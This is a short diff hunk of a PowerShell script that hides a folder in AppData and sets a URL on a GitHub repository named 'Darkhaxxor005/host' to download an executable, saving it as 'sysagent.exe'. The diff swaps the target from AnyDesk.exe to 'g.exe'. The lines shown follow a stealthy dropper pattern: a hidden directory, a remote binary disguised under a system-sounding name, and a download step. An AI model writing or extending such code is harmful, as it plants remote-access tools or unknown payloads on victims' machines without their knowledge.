@@ -36,7 +36,7 @@ if (-not (Test-Path $AppDataPath)) {
 Set-ItemProperty -Path $AppDataPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
 # Define the URL of the .exe file and the destination path
-$exeUrl = "https://github.com/Darkhaxxor005/host/raw/refs/heads/main/AnyDesk.exe"  # Replace with the actual URL of the .exe
+$exeUrl = "https://github.com/Darkhaxxor005/host/raw/refs/heads/main/g.exe"  # Replace with the actual URL of the .exe
 $exePath = "$AppDataPath\sysagent.exe"
 
 # Download the .exe file
